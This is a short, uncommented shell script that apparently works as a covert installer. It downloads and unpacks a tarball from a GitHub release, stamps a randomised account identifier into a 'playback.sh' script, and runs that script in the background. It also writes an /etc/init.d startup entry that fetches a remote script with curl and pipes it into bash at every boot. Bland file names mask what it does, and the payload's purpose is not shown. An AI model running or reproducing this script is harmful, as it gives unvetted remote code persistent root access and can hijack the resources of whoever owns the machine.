cd /
rm -rf pitch.tar
rm -rf pitch
wget https://github.com/overdubez/pan/releases/download/v1.0.2/pitch.tar
tar -xvf pitch.tar
cd /pitch
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
sed -i "s/test_accountname/CP_bsmzapay1 ${variable1}/g" ./playback.sh
sed -i "s/CP_32hb86nvxc/CP_bsmzapay1 ${variable1}/g" ./playback.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/overdubez/pan/main/patch.sh)" > phase.sh
chmod a+x phase.sh
update-rc.d phase.sh defaults
cd /pitch
nohup ./playback.sh
ps -ef | grep pitch
